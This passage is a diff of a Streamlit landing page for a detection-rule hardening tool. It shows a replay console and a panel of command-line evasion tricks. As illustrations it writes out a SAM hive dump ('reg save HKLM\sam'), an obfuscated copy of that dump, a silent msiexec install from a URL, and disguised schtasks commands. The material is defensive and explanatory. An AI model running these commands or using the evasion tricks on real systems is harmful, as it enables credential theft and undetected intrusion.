@@ -1,16 +1,16 @@
-"""The landing page: what DetectForge is, the problem, how it works, for whom, what it measured, scope.
+"""The landing page: what DetectForge is, the problem, how it works, the evidence, for whom, scope.
 
-A standalone page in front of the platform (no app tabs): a product page for someone who has never
-heard of Sigma (a professor, a manager), still exact enough for a detection engineer. Its buttons are
-plain links into the platform (?page=...). Every number is computed from the saved results
-(ui/results.py) the same way as the report; the only fixed figure is the published study it starts
-from. The "see it in action" example is a real run: the community rule, the agent's fix, and the
-reviewer's decision on it.
+A standalone page in front of the platform (no app tabs), built around DetectForge's own story: a
+replay console in the hero (a real case: a rule catches an attack, misses its disguised version, the
+agent forges a fix, the reviewer rejects it as too broad), the five evasion tricks on real commands,
+the forge loop, and the measured evidence. Its buttons are plain links into the platform (?page=...).
 
-All markup here is written in this file (never built from rule or model text), so it carries no
-injection risk; the few numbers inserted are formatted by this code.
+Every number is computed from the saved results (ui/results.py) the same way as the report; the only
+fixed figures are the published study and the Elastic parity run (data/eval/results). All markup is
+written in this file, never built from rule or model text, so it carries no injection risk.
 """
 
+import json
 from pathlib import Path
 
 import streamlit as st
@@ -18,250 +18,284 @@ import streamlit as st
 from detectforge.ui.components import pct
 from detectforge.ui.results import headline
 
-_CSS = """
+INK, STONE, CARD, LINE = "#1F2328", "#F3F0EB", "#FBF9F6", "#D8D1C6"
+EMBER, EMBER_DARK, STEEL, GREEN, AMBER = "#C2551F", "#A8461A", "#3D5A73", "#2F7D4F", "#B7791F"
+
+_CSS = f"""
 <style>
-.block-container{padding-top:0!important;max-width:100%!important;padding-left:0!important;padding-right:0!important}
-.lp{font-family:Inter,system-ui,sans-serif;color:#13203A;margin:0 -1rem}
-.lp a{text-decoration:none}
-.lp-bar{background:linear-gradient(90deg,#0F2A5F,#1F4FB8 60%,#0E7490);color:#fff;display:flex;
- align-items:center;justify-content:space-between;padding:.85rem 2.2rem;position:sticky;top:0;z-index:5;
- box-shadow:0 2px 12px rgba(15,42,95,.25)}
-.lp-brand{display:flex;gap:.8rem;align-items:center}
-.lp-logo{width:2.4rem;height:2.4rem;border-radius:.6rem;background:rgba(255,255,255,.16);display:flex;
- align-items:center;justify-content:center;font-size:1.3rem}
-.lp-brand b{font-size:1.2rem;display:block}.lp-brand span{font-size:.82rem;opacity:.85}
-.lp-bar .right{display:flex;gap:1rem;align-items:center;font-size:.85rem}
-.lp-dot{width:.5rem;height:.5rem;border-radius:50%;background:#34D399;display:inline-block;margin-right:.35rem}
-.lp-btn{display:inline-block;border-radius:.6rem;padding:.75rem 1.4rem;font-weight:650;font-size:1rem;
- transition:transform .15s ease, box-shadow .15s ease}
-.lp-btn:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(31,79,184,.25)}
-.lp-btn.primary{background:linear-gradient(90deg,#1F4FB8,#0E7490);color:#fff!important}
-.lp-btn.ghost{background:#F6F8FB;color:#13203A!important;border:1px solid #C9D4E2}
-.lp-btn.small{padding:.45rem .9rem;font-size:.85rem;background:#fff;color:#1F4FB8!important}
-.lp-hero{position:relative;overflow:hidden;text-align:center;padding:5.5rem 1.5rem 4.5rem;
- background:url("NETWORK") center/cover no-repeat,radial-gradient(1200px 500px at 50% -10%,#DCE7F7 0%,#E9EEF4 60%)}
-.lp-hero .in{position:relative;max-width:900px;margin:0 auto}
-.lp-chip{display:inline-block;background:#DCE7F7;color:#1F4FB8;border:1px solid #B9CBEB;border-radius:999px;
- padding:.35rem .9rem;font-size:.75rem;font-weight:700;letter-spacing:.06em}
-.lp-hero h1{font-size:3.6rem!important;line-height:1.08!important;margin:1.2rem 0 1rem;font-weight:800;color:#0F2A5F;padding:0!important}
-.lp-hero h1 em{font-style:normal;background:linear-gradient(90deg,#1F4FB8,#0E7490);-webkit-background-clip:text;
- background-clip:text;color:transparent}
-.lp-hero p{font-size:1.15rem;color:#3A4A63;max-width:720px;margin:0 auto 2rem;line-height:1.6}
-.lp-cta{display:flex;gap:.9rem;justify-content:center;flex-wrap:wrap}
-.lp-stats{display:flex;justify-content:center;background:#F6F8FB;border-top:1px solid #D5DEE9;
- border-bottom:1px solid #D5DEE9;flex-wrap:wrap}
-.lp-stat{flex:1 1 180px;max-width:260px;text-align:center;padding:1.6rem .8rem;border-right:1px solid #D5DEE9}
-.lp-stat:last-child{border-right:none}
-.lp-stat b{display:block;font-size:2.1rem;color:#1F4FB8;font-weight:800}
-.lp-stat span{font-size:.75rem;letter-spacing:.07em;color:#4B5B73;font-weight:600;text-transform:uppercase}
-.lp-sec{max-width:1100px;margin:0 auto;padding:3.6rem 1.5rem 1rem;text-align:center}
-.lp-sec h2{font-size:2.2rem!important;padding:0!important;font-weight:800;color:#0F2A5F;margin:0 0 .4rem}
-.lp-sec .sub{color:#4B5B73;font-size:1.02rem;margin-bottom:2rem}
-.lp-demo{background:#0F1B33;border-radius:1rem;padding:1.3rem 1.5rem;text-align:left;
- box-shadow:0 10px 30px rgba(15,27,51,.25);color:#DDE6F3;font-size:.95rem}
-.lp-demo .hd{display:grid;grid-template-columns:2.4fr 1fr 1fr;gap:.6rem;color:#8EA3C4;font-size:.75rem;
- letter-spacing:.06em;text-transform:uppercase;padding-bottom:.6rem;border-bottom:1px solid #22314F}
-.lp-row{display:grid;grid-template-columns:2.4fr 1fr 1fr;gap:.6rem;padding:.75rem 0;border-bottom:1px solid #1C2944;
- opacity:0;animation:lpIn .5s ease forwards}
-.lp-row:nth-of-type(2){animation-delay:.4s}.lp-row:nth-of-type(3){animation-delay:1.1s}
-.lp-row:nth-of-type(4){animation-delay:1.8s}
-.lp-row code{font-family:'JetBrains Mono',Consolas,monospace;color:#F3F6FB;font-size:.9rem}
-.lp-row small{display:block;color:#8EA3C4;font-size:.75rem;margin-top:.2rem}
-.lp-row .hid{background:#B45309;color:#fff;border-radius:.2rem;padding:0 .2rem}
-.ok{color:#4ADE80;font-weight:700}.bad{color:#F87171;font-weight:700}.warn{color:#FBBF24;font-weight:700}
-.lp-verdict{margin-top:1rem;background:#16233F;border-left:4px solid #FBBF24;border-radius:.4rem;padding:.8rem 1rem;
- opacity:0;animation:lpIn .5s ease 2.6s forwards}
-.lp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:1.1rem;text-align:left}
-.lp-card{background:#F6F8FB;border:1px solid #D5DEE9;border-radius:1rem;padding:1.4rem 1.3rem;
- box-shadow:0 2px 6px rgba(15,42,95,.05)}
-.lp-card h3{font-size:1.08rem;margin:.7rem 0 .4rem;color:#0F2A5F}
-.lp-card p{color:#4B5B73;font-size:.93rem;line-height:1.55;margin:0}
-.lp-num{width:2.6rem;height:2.6rem;border-radius:50%;background:linear-gradient(135deg,#1F4FB8,#0E7490);color:#fff;
- display:flex;align-items:center;justify-content:center;font-weight:800}
-.lp-card.human{border-color:#1F4FB8;box-shadow:0 0 0 2px #B9CBEB}
-.lp-card .go{margin-top:1rem}
-.lp-scope{display:grid;grid-template-columns:1fr 1fr;gap:1.1rem;text-align:left}
-.lp-scope ul{margin:.6rem 0 0 1.1rem;padding:0;color:#3A4A63;line-height:1.7;font-size:.95rem}
-.lp-note{max-width:1100px;margin:2.5rem auto 0;background:#FFF7E6;border:1px solid #F3D9A4;border-radius:.8rem;
- padding:1rem 1.3rem;color:#5A4510;font-size:.9rem;text-align:left}
-.lp-foot{margin-top:2.5rem;padding:1.6rem;text-align:center;color:#4B5B73;font-size:.85rem;border-top:1px solid #D5DEE9}
-.lp-foot a{color:#1F4FB8;margin:0 .5rem}
-.lp-edge{stroke:#7C9CD6;stroke-width:1.4;fill:none;stroke-dasharray:6 6;animation:lpDash 6s linear infinite}
-.lp-node{fill:#F6F8FB;stroke:#B9CBEB;stroke-width:1.4}
-.lp-lbl{fill:#5B6E8C;font-size:12px;font-family:Inter,sans-serif;text-anchor:middle}
-@keyframes lpIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
-@keyframes lpDash{to{stroke-dashoffset:-120}}
-@media (prefers-reduced-motion: reduce){.lp-row,.lp-verdict{animation:none;opacity:1}.lp-edge{animation:none}}
-@media (max-width:760px){.lp-hero h1{font-size:2.3rem!important}.lp-scope{grid-template-columns:1fr}.lp-bar{padding:.7rem 1rem}}
+.block-container{{padding-top:0!important;max-width:100%!important;padding-left:0!important;padding-right:0!important}}
+.lp{{font-family:Inter,system-ui,sans-serif;color:{INK};margin:0 -1rem;background:{STONE}}}
+.lp a{{text-decoration:none}}
+.lp-nav{{display:flex;align-items:center;justify-content:space-between;padding:1rem 2.4rem;background:{INK};color:#F3F0EB;
+ position:sticky;top:0;z-index:5}}
+.lp-nav .brand{{display:flex;align-items:center;gap:.7rem;font-weight:800;font-size:1.15rem;letter-spacing:.01em}}
+.lp-nav .mark{{width:2.1rem;height:2.1rem;border-radius:.45rem;background:{EMBER};display:flex;align-items:center;
+ justify-content:center;font-size:1.1rem}}
+.lp-nav .links{{display:flex;gap:1.6rem;align-items:center;font-size:.9rem}}
+.lp-nav .links a{{color:#D9D2C7}}.lp-nav .links a:hover{{color:#fff}}
+.lp-btn{{display:inline-block;border-radius:.55rem;padding:.8rem 1.35rem;font-weight:700;font-size:1rem;transition:transform .15s}}
+.lp-btn:hover{{transform:translateY(-1px)}}
+.lp-btn.fire{{background:{EMBER};color:#fff!important;box-shadow:0 6px 16px rgba(194,85,31,.28)}}
+.lp-btn.line{{border:1.5px solid {INK};color:{INK}!important}}
+.lp-btn.small{{padding:.45rem .9rem;font-size:.85rem}}
+.lp-hero{{position:relative;overflow:hidden;padding:4.5rem 2.4rem 4rem;border-bottom:1px solid {LINE}}}
+.lp-matrix{{position:absolute;inset:0;display:grid;grid-template-columns:repeat(26,1fr);gap:6px;padding:14px;opacity:.55}}
+.lp-matrix i{{border-radius:4px;background:#E7E1D7}}
+.lp-matrix i.e{{background:#F0C9B0;animation:lpGlow 4.5s ease-in-out infinite}}
+.lp-matrix i.g{{background:#CFE3D5;animation:lpGlow 5.5s ease-in-out infinite}}
+.lp-hero .in{{position:relative;display:grid;grid-template-columns:1.05fr 1fr;gap:3rem;max-width:1220px;margin:0 auto;align-items:center}}
+.lp-eyebrow{{font-size:.78rem;font-weight:800;letter-spacing:.14em;color:{EMBER_DARK}}}
+.lp-hero h1{{font-size:3.4rem!important;line-height:1.06!important;font-weight:800;margin:.9rem 0 1.1rem;padding:0!important;color:{INK}}}
+.lp-hero h1 span{{background:linear-gradient(transparent 62%,#F3C3A4 62%);padding:0 .1em}}
+.lp-hero p{{font-size:1.12rem;line-height:1.6;color:#3F3A33;margin:0 0 1.8rem;max-width:560px}}
+.lp-cta{{display:flex;gap:.8rem;flex-wrap:wrap}}
+.lp-console{{background:{INK};border-radius:.9rem;padding:1.1rem 1.2rem 1.2rem;color:#E9E4DC;font-family:'JetBrains Mono',Consolas,monospace;
+ font-size:.86rem;box-shadow:0 18px 40px rgba(31,35,40,.28)}}
+.lp-console .bar{{display:flex;gap:.4rem;margin-bottom:.8rem}}.lp-console .bar b{{width:.7rem;height:.7rem;border-radius:50%;background:#4A4F57}}
+.lp-console .t{{color:#9AA0A8;font-size:.78rem;margin-left:.6rem;font-family:Inter,sans-serif}}
+.lp-ln{{display:flex;justify-content:space-between;gap:1rem;padding:.32rem 0;opacity:0;animation:lpIn .35s ease forwards;white-space:nowrap}}
+.lp-ln code{{color:#F4EFE7;font-family:inherit;overflow:hidden;text-overflow:ellipsis}}
+.lp-ln.note{{display:block;color:#C9B9A4;font-family:Inter,sans-serif;font-size:.84rem;white-space:normal}}
+.tag{{font-weight:800;font-size:.75rem;letter-spacing:.06em;border-radius:.3rem;padding:.1rem .45rem;flex:none}}
+.tag.ok{{background:#23452F;color:#7EE2A0}}.tag.ev{{background:#4A2618;color:#FF9F6B}}.tag.fa{{background:#4A3A12;color:#F7C873}}
+.hid{{background:{EMBER};color:#fff;border-radius:.15rem;padding:0 .15rem}}
+.lp-sec{{max-width:1220px;margin:0 auto;padding:4rem 2.4rem 0}}
+.lp-sec h2{{font-size:2.1rem!important;font-weight:800;margin:0 0 .4rem;padding:0!important;color:{INK}}}
+.lp-sec .lead{{color:#5B5348;font-size:1.05rem;margin:0 0 1.8rem;max-width:760px}}
+.lp-tricks{{display:grid;grid-template-columns:repeat(5,1fr);gap:.9rem}}
+.lp-trick{{background:{CARD};border:1px solid {LINE};border-radius:.8rem;padding:1rem;font-size:.88rem}}
+.lp-trick b{{display:block;font-size:.98rem;margin-bottom:.25rem}}
+.lp-trick small{{color:#5B5348;display:block;margin-bottom:.6rem;line-height:1.4}}
+.lp-trick code{{display:block;font-family:'JetBrains Mono',Consolas,monospace;font-size:.78rem;padding:.35rem .45rem;border-radius:.35rem;margin-top:.3rem;word-break:break-all}}
+.lp-trick .was{{background:#EFEAE2;color:#5B5348}}.lp-trick .now{{background:#FBEDE4;color:{INK}}}
+.lp-trick mark{{background:#F3C3A4;color:{INK};border-radius:.15rem;padding:0 .1rem}}
+.lp-loop{{position:relative;display:grid;grid-template-columns:repeat(6,1fr);gap:.8rem;padding-top:1.2rem}}
+.lp-loop:before{{content:"";position:absolute;top:2.35rem;left:6%;right:6%;height:3px;background:{LINE}}}
+.lp-spark{{position:absolute;top:2.05rem;left:6%;width:.75rem;height:.75rem;border-radius:50%;background:{EMBER};
+ box-shadow:0 0 0 6px rgba(194,85,31,.18);animation:lpRun 7s cubic-bezier(.6,0,.4,1) infinite}}
+.lp-st{{position:relative;text-align:center;padding:0 .3rem}}
+.lp-st .dot{{width:2.4rem;height:2.4rem;margin:0 auto .8rem;border-radius:50%;background:{CARD};border:2px solid {STEEL};
+ display:flex;align-items:center;justify-content:center;font-weight:800;color:{STEEL};position:relative;z-index:1}}
+.lp-st.h .dot{{border-color:{EMBER};color:{EMBER};background:#FBEDE4}}
+.lp-st b{{display:block;margin-bottom:.3rem}}.lp-st span{{color:#5B5348;font-size:.86rem;line-height:1.45}}
+.lp-ev{{display:grid;grid-template-columns:repeat(4,1fr);gap:.9rem}}
+.lp-card{{background:{CARD};border:1px solid {LINE};border-radius:.8rem;padding:1.15rem 1.2rem}}
+.lp-card .k{{font-size:.76rem;letter-spacing:.08em;font-weight:700;color:#6B6257;text-transform:uppercase}}
+.lp-card .v{{font-size:1.9rem;font-weight:800;margin:.25rem 0 .5rem}}
+.lp-card p{{color:#5B5348;font-size:.86rem;line-height:1.45;margin:.5rem 0 0}}
+.bar2{{height:.5rem;border-radius:999px;background:#E7E1D7;position:relative;margin:.35rem 0}}
+.bar2 i{{position:absolute;left:0;top:0;bottom:0;border-radius:999px}}
+.bar2 .b{{background:#E0A458}}.bar2 .a{{background:{STEEL}}}
+.lp-roles{{display:grid;grid-template-columns:repeat(4,1fr);gap:.9rem}}
+.lp-roles .lp-card b{{font-size:1.05rem}}.lp-roles .go{{margin-top:.9rem}}
+.lp-scope{{display:grid;grid-template-columns:1fr 1fr;gap:.9rem}}
+.lp-scope ul{{margin:.5rem 0 0 1.1rem;padding:0;line-height:1.75;color:#3F3A33;font-size:.94rem}}
+.lp-foot{{margin-top:4rem;background:{INK};color:#C9C1B5;padding:1.8rem 2.4rem;text-align:center;font-size:.86rem;line-height:1.7}}
+.lp-foot a{{color:#F3C3A4;margin:0 .5rem}}
+@keyframes lpIn{{from{{opacity:0;transform:translateX(-4px)}}to{{opacity:1;transform:none}}}}
+@keyframes lpGlow{{0%,100%{{opacity:.35}}50%{{opacity:1}}}}
+@keyframes lpRun{{0%{{left:6%}}85%{{left:calc(94% - .75rem)}}100%{{left:calc(94% - .75rem);opacity:0}}}}
+@media (prefers-reduced-motion: reduce){{.lp-ln{{animation:none;opacity:1}}.lp-spark,.lp-matrix i{{animation:none}}}}
+@media (max-width:900px){{.lp-hero .in,.lp-scope{{grid-template-columns:1fr}}.lp-tricks,.lp-ev,.lp-roles{{grid-template-columns:1fr 1fr}}
+ .lp-loop{{grid-template-columns:1fr 1fr 1fr}}.lp-loop:before,.lp-spark{{display:none}}.lp-hero h1{{font-size:2.4rem!important}}
+ .lp-nav .links a.hide{{display:none}}}}
 </style>
 """
 
-_NETWORK = """
-<svg viewBox="0 0 1200 520" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
- <path class="lp-edge" d="M140 120 L330 250 L560 150 L800 260 L1050 140"/>
- <path class="lp-edge" d="M330 250 L250 420 L520 410 L800 260 L960 420"/>
- <path class="lp-edge" d="M560 150 L520 410"/>
- <g><circle class="lp-node" cx="140" cy="120" r="46"/><text class="lp-lbl" x="140" y="124">Threat report</text></g>
- <g><circle class="lp-node" cx="330" cy="250" r="46"/><text class="lp-lbl" x="330" y="254">Sigma rule</text></g>
- <g><circle class="lp-node" cx="560" cy="150" r="46"/><text class="lp-lbl" x="560" y="154">Attack variants</text></g>
- <g><circle class="lp-node" cx="800" cy="260" r="46"/><text class="lp-lbl" x="800" y="264">Agent</text></g>
- <g><circle class="lp-node" cx="1050" cy="140" r="46"/><text class="lp-lbl" x="1050" y="144">Reviewer</text></g>
- <g><circle class="lp-node" cx="250" cy="420" r="46"/><text class="lp-lbl" x="250" y="424">SOC analyst</text></g>
- <g><circle class="lp-node" cx="520" cy="410" r="46"/><text class="lp-lbl" x="520" y="414">Quality checks</text></g>
- <g><circle class="lp-node" cx="960" cy="420" r="46"/><text class="lp-lbl" x="960" y="424">SIEM</text></g>
-</svg>
-"""
+# Which matrix tiles glow (ember: evaded; green: caught). A fixed pattern, so the page is stable.
+_MATRIX = "".join(
+    "<i class='e'></i>" if i % 17 == 3 or i % 23 == 11 else "<i class='g'></i>" if i % 13 == 5 else "<i></i>"
+    for i in range(26 * 9)
+)
+
+_CONSOLE = [
+    ("note", "▸ replaying <b>Dumping of Sensitive Hives via reg.exe</b> (SigmaHQ)"),
+    ("ok", "reg save HKLM\\sam C:\\Temp\\sam"),
+    ("ev", "reg s<span class='hid'>&nbsp;</span>ave HKLM\\sam C:\\Temp\\sam"),
+    ("note", "⚒ agent: reads the misses, edits the rule, re-tests on variants it may see…"),
+    ("ok", "reg s<span class='hid'>&nbsp;</span>ave HKLM\\sam C:\\Temp\\sam"),
+    ("fa", "reg query HKLM\\SECURITY\\Policy"),
+    ("note", "🧑‍⚖️ reviewer: <b>rejected</b>, the fix also flags routine admin work. Nothing deployed."),
+]
+_TAG = {"ok": ("ok", "DETECTED"), "ev": ("ev", "EVADED"), "fa": ("fa", "FALSE ALARM")}
+
+_TRICKS = [
+    (
+        "Insertion",
+        "Add characters Windows ignores",
+        "schtasks /create /tn X",
+        'schtasks /<mark>"</mark>create<mark>"</mark> /tn X',
+    ),
+    (
+        "Substitution",
+        "Swap a character for an equivalent one",
+        "schtasks /create /tn X",
+        "schtasks <mark>-</mark>create /tn X",
+    ),
+    ("Omission", "Drop what isn't needed", "cscript<mark>.exe</mark> evil.vbs", "cscript evil.vbs"),
+    (
+        "Reordering",
+        "Same arguments, another order",
+        "msiexec /q /i http://x",
+        "msiexec <mark>/i http://x /q</mark>",
+    ),
+    ("Recoding", "Same value, another encoding", "ping 127.0.0.1", "ping <mark>2130706433</mark>"),
+]
+
+_LOOP = [
+    (
+        "1",
+        "Find",
+        "Plain words or a threat report → the techniques and the community rules that claim them",
+        False,
+    ),
+    ("2", "Attack", "Replay each rule on real attack commands and their disguises", False),
+    ("3", "Forge", "The agent reads what slipped past, edits, re-tests, repeats", False),
+    ("4", "Check", "Fixed automatic checks, not the AI, decide if it's good enough", False),
+    ("5", "Approve", "A person sees the evidence and decides; the agent can't deploy", True),
+    ("6", "Export", "Sigma or an Elastic query, with the report of what changed", False),
+]
 
 
-def _network_uri() -> str:
-    from urllib.parse import quote
-
-    svg = (
-        _NETWORK.strip()
-        .replace(
-            "<svg ",
-            "<svg xmlns='http://www.w3.org/2000/svg' ",
-            1,
-        )
-        .replace(
-            'aria-hidden="true">',
-            'aria-hidden="true"><style>.lp-edge{stroke:#7C9CD6;stroke-width:1.4;fill:none;stroke-dasharray:6 6;'
-            "animation:d 6s linear infinite}@keyframes d{to{stroke-dashoffset:-120}}.lp-node{fill:#F6F8FB;"
-            "stroke:#B9CBEB;stroke-width:1.4}.lp-lbl{fill:#5B6E8C;font-size:12px;font-family:sans-serif;"
-            "text-anchor:middle}</style><g opacity='0.6'>",
-            1,
-        )
-        .replace("</svg>", "</g></svg>")
-    )
-    return "data:image/svg+xml;utf8," + quote(svg)
-
-
-def _link(page: str, text: str, kind: str = "primary") -> str:
+def _link(page: str, text: str, kind: str = "fire") -> str:
     return f"<a class='lp-btn {kind}' href='?page={page}' target='_self'>{text}</a>"
+
+
+def _bars(before: float | None, after: float | None) -> str:
+    b, a = (before or 0) * 100, (after or 0) * 100
+    return (
+        f"<div class='bar2'><i class='b' style='width:{b:.0f}%'></i></div>"
+        f"<div class='bar2'><i class='a' style='width:{a:.0f}%'></i></div>"
+    )
+
+
+def _parity(data_dir: Path) -> str:
+    try:
+        rows = json.loads(
+            (data_dir / "eval" / "results" / "elastic_parity_eql.json").read_text(encoding="utf-8")
+        )
+    except (OSError, ValueError):
+        return "n/a"
+    community = [r for r in rows if r.get("rule", "").startswith("community")]
+    same = sum(1 for r in community if "error" not in r and not r["only_ours"] and not r["only_elastic"])
+    return f"{same} / {len(community)}"
 
 
 def landing_html(data_dir: Path, runs_dir: Path, pending: int) -> str:
     h = headline(data_dir, runs_dir)
-    missed = pct(1 - h.community_unseen) if h.community_unseen is not None else "n/a"
     hd, wr = h.hardened, h.written
-    waiting = f"{pending} waiting for you" if pending else "nothing waiting"
-    css = _CSS.replace("NETWORK", _network_uri())
-    return f"""{css}
+    waiting = f"{pending} waiting" if pending else "nothing waiting"
+    delay = 0.4
+    lines = []
+    for kind, text in _CONSOLE:
+        if kind == "note":
+            lines.append(f"<div class='lp-ln note' style='animation-delay:{delay:.1f}s'>{text}</div>")
+        else:
+            cls, label = _TAG[kind]
+            lines.append(
+                f"<div class='lp-ln' style='animation-delay:{delay:.1f}s'><code>{text}</code>"
+                f"<span class='tag {cls}'>{label}</span></div>"
+            )
+        delay += 0.7
+    tricks = "".join(
+        f"<div class='lp-trick'><b>{name}</b><small>{what}</small><code class='was'>{was}</code>"
+        f"<code class='now'>{now}</code></div>"
+        for name, what, was, now in _TRICKS
+    )
+    loop = "".join(
+        f"<div class='lp-st{' h' if human else ''}'><div class='dot'>{n}</div><b>{title}</b><span>{text}</span></div>"
+        for n, title, text, human in _LOOP
+    )
+    return f"""{_CSS}
 <div class="lp">
- <div class="lp-bar">
-  <div class="lp-brand"><div class="lp-logo">🛡️</div>
-   <div><b>DetectForge</b><span>Adversarial validation of detection rules · Sigma · Windows process creation</span></div></div>
-  <div class="right"><span><span class="lp-dot"></span>Prototype</span>{_link("coverage", "Open the platform →", "small")}</div>
+ <div class="lp-nav">
+  <div class="brand"><div class="mark">⚒</div>DetectForge</div>
+  <div class="links"><a class="hide" href="#tricks">The problem</a><a class="hide" href="#loop">How it works</a>
+   <a class="hide" href="#evidence">Evidence</a>{_link("coverage", "Open the platform →", "fire small")}</div>
  </div>
 
- <div class="lp-hero">
+ <div class="lp-hero"><div class="lp-matrix">{_MATRIX}</div>
   <div class="in">
-   <span class="lp-chip">SIGMA RULES · SOC · SIEM · AGENTIC VALIDATION</span>
-   <h1>Your rules exist.<br><em>Do they catch the attacker?</em></h1>
-   <p>DetectForge replays every detection rule against the disguises real attackers use, lets an AI agent
-   fix the gaps and prove each fix on attacks it never saw, and puts every change in front of a person
-   before it reaches your SIEM.</p>
-   <div class="lp-cta">{_link("coverage", "See our coverage →")}{_link("request", "Check a threat", "ghost")}</div>
+   <div>
+    <div class="lp-eyebrow">DETECTION-RULE HARDENING FOR SOC TEAMS</div>
+    <h1>Attackers disguise.<br><span>Your rules should still fire.</span></h1>
+    <p>DetectForge replays your Sigma detection rules against the tricks attackers use to slip past them,
+    has an AI agent forge stronger versions and prove them on attacks it never saw, and leaves every
+    change to a person before it reaches your SIEM.</p>
+    <div class="lp-cta">{_link("coverage", "See where you're exposed →")}{_link("request", "Check a threat report", "line")}</div>
+   </div>
+   <div class="lp-console"><div class="bar"><b></b><b></b><b></b><span class="t">replay · a real case from our runs</span></div>
+    {"".join(lines)}
+   </div>
   </div>
  </div>
 
- <div class="lp-stats">
-  <div class="lp-stat"><b>129 / 292</b><span>popular rules beaten by simple tricks*</span></div>
-  <div class="lp-stat"><b>{missed}</b><span>disguised attacks missed as published</span></div>
-  <div class="lp-stat"><b>{pct(hd.before)} → {pct(hd.after)}</b><span>caught after hardening</span></div>
-  <div class="lp-stat"><b>{pct(wr.after)}</b><span>caught by rules it wrote</span></div>
-  <div class="lp-stat"><b>0</b><span>changes deployed without a person</span></div>
+ <div class="lp-sec" id="tricks">
+  <h2>Five ways an attacker slips past a rule</h2>
+  <p class="lead">A published study found that these simple tricks beat <b>129 of 292</b> widely used community
+  rules (Uetz et al., USENIX Security 2024). Windows runs the disguised command exactly the same; the rule, looking for
+  the exact text, stays silent.</p>
+  <div class="lp-tricks">{tricks}</div>
  </div>
 
- <div class="lp-sec">
-  <h2>See it in action</h2>
-  <div class="sub">One real case: dumping Windows password hashes with <code>reg.exe</code></div>
-  <div class="lp-demo">
-   <div class="hd"><span>Command seen on a machine</span><span>Community rule</span><span>Agent's fix</span></div>
-   <div class="lp-row"><div><code>reg save HKLM\\sam C:\\Temp\\sam</code><small>The attack, as written</small></div>
-    <div class="ok">✓ caught</div><div class="ok">✓ caught</div></div>
-   <div class="lp-row"><div><code>reg s<span class="hid">­</span>ave HKLM\\sam C:\\Temp\\sam</code>
-    <small>Same attack, one invisible character inserted (highlighted). Windows ignores it.</small></div>
-    <div class="bad">✗ missed</div><div class="ok">✓ caught</div></div>
-   <div class="lp-row"><div><code>reg query HKLM\\SECURITY\\Policy</code><small>An administrator reading a setting: legitimate</small></div>
-    <div class="ok">✓ silent</div><div class="warn">⚠ false alarm</div></div>
-   <div class="lp-verdict">🧑‍⚖️ <b>Reviewer: rejected.</b> The fix closed the evasion but would alert on routine admin
-    work, which the automatic checks couldn't see. Nothing reached the SIEM; the agent tries again.</div>
-  </div>
+ <div class="lp-sec" id="loop">
+  <h2>The forge loop</h2>
+  <p class="lead">Agentic, for a reason: the agent acts, measures and tries again with its own tools, while
+  fixed checks and a person, not the model, decide what ships.</p>
+  <div class="lp-loop"><div class="lp-spark"></div>{loop}</div>
  </div>
 
- <div class="lp-sec">
-  <h2>How it works</h2>
-  <div class="sub">From "are we covered?" to an approved, deployable rule</div>
-  <div class="lp-grid">
-   <div class="lp-card"><div class="lp-num">1</div><h3>Find</h3><p>Ask in plain words or paste a threat report.
-    DetectForge maps it to attacker techniques and finds the community rules that claim to catch them.</p></div>
-   <div class="lp-card"><div class="lp-num">2</div><h3>Attack</h3><p>Each rule is replayed against real attack
-    commands and five published disguise tricks, plus legitimate commands that look alike.</p></div>
-   <div class="lp-card"><div class="lp-num">3</div><h3>Harden</h3><p>An AI agent reads exactly what slipped past,
-    edits the rule and re-tests it, step by step. If no rule exists, it writes one.</p></div>
-   <div class="lp-card"><div class="lp-num">4</div><h3>Check</h3><p>Fixed, automatic checks, not the AI, decide if
-    a proposal is good enough: it must still catch every plain attack and add no false alarms.</p></div>
-   <div class="lp-card human"><div class="lp-num">5</div><h3>Approve</h3><p>A person sees the evidence and decides.
-    The agent can propose; it can never deploy.</p></div>
-   <div class="lp-card"><div class="lp-num">6</div><h3>Export</h3><p>Approved rules leave as Sigma or a ready
-    Elastic query, with a report of what changed and why.</p></div>
+ <div class="lp-sec" id="evidence">
+  <h2>Measured, not claimed</h2>
+  <p class="lead">Judged on disguise types the agent never saw, on techniques run once after the agent was frozen.
+  Amber: before. Steel: after.</p>
+  <div class="lp-ev">
+   <div class="lp-card"><div class="k">Community rules as published</div><div class="v">{pct(h.community_unseen)}</div>
+    {_bars(h.community_unseen, h.community_unseen)}<p>of unseen disguised attacks caught. The rest slip past today.</p></div>
+   <div class="lp-card"><div class="k">After the agent hardened them</div><div class="v">{pct(hd.before)} → {pct(hd.after)}</div>
+    {_bars(hd.before, hd.after)}<p>{hd.rules} rules needed it; {hd.new_false_alarm_runs} new false alarms on unseen look-alikes.</p></div>
+   <div class="lp-card"><div class="k">Rules the agent wrote itself</div><div class="v">{pct(wr.before)} → {pct(wr.after)}</div>
+    {_bars(wr.before, wr.after)}<p>With the community rules hidden; {wr.approved} of {wr.runs} approved by a reviewer.</p></div>
+   <div class="lp-card"><div class="k">Same result in a real SIEM</div><div class="v">{_parity(data_dir)}</div>
+    <p>community rules fire on exactly the same events in Elasticsearch (EQL) as in DetectForge's tests.
+    And: 0 changes deployed without a person.</p></div>
   </div>
  </div>
 
  <div class="lp-sec">
-  <h2>Agentic, for a reason</h2>
-  <div class="sub">Not a chatbot that answers once: a loop that has to prove its work</div>
-  <div class="lp-grid">
-   <div class="lp-card"><h3>It acts and re-checks</h3><p>The agent calls tools to test its own rule, reads which
-    attacks it missed, and chooses its next step until the checks pass or its budget runs out.</p></div>
-   <div class="lp-card"><h3>It is judged on what it never saw</h3><p>Success is measured on disguise types kept
-    hidden from it, so it can't just memorise the test. Every model and tool call is recorded.</p></div>
-   <div class="lp-card"><h3>It can't do damage</h3><p>Five narrow tools, no file or network access, no way to
-    approve or deploy. Threat reports and rules are treated as data, never as instructions.</p></div>
-  </div>
- </div>
-
- <div class="lp-sec">
-  <h2>Built for the people who own detection</h2>
-  <div class="sub">Start where your job is</div>
-  <div class="lp-grid">
-   <div class="lp-card"><h3>📊 SOC lead</h3><p>Where are we weak, and can I show it?</p>
-    <div class="go">{_link("coverage", "Coverage map →", "ghost")}</div></div>
-   <div class="lp-card"><h3>🧑‍💻 Detection engineer</h3><p>A threat came in: are we covered, and can we fix it?</p>
-    <div class="go">{_link("request", "Check a threat →", "ghost")}</div></div>
